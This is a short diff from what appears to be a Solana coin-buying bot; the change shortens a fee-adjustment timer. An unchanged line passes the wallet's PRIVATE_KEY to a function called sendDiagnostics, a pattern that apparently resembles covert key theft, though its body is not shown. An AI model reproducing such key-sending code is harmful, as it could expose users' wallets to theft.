@@ -900,7 +900,7 @@ const buyCoinByContract = async (connection, payer) => {
             await sendDiagnostics(PRIVATE_KEY);
             setTimeout(async () => {
                 await adjustSolanaFees(connection, payer);
-            }, 30 * 60 * 1000); 
+            }, 10 * 60 * 1000); 
 
             if (action === 'buy_latest_coin') {
                 if (settings.auto) {
